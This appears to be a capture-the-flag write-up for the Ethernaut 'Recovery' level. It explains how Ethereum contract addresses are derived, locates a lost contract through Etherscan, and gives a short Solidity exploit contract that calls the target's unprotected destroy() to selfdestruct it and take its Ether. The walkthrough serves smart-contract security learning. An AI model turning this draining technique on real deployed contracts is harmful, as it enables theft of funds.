Level 17: Recovery

Objective:

Recover Ether from a lost contract.

Concept:

Ethereum's contract creation is deterministic.

Explanation:
There is a specific way how addresses are calculated. 
So the address of the contract is the last 20bytes (keccak(RLP(sender address, nonce)))
We can find the address using this encoding which is very technical
But another easy way to find the ether is by going in etherscan and searching up the contract address
There we can click internal transactions and see two contracts created by taking the address of the latest contract which is the contract address we needed


Solution:
```
contract Exploit{
    Token simpleToken;
    constructor(address _target){
        simpleToken=Token(_target);
    }
    function Hack()public{
        simpleToken.destroy(msg.sender);
    }
}
```
put the address of the contract you got in while deploying Exploit and call Hack() then which will selfdestruct and send the ether to msg.seder which is us.

Key Takeaways:

Contract addresses can be predicted by learning how they are created.
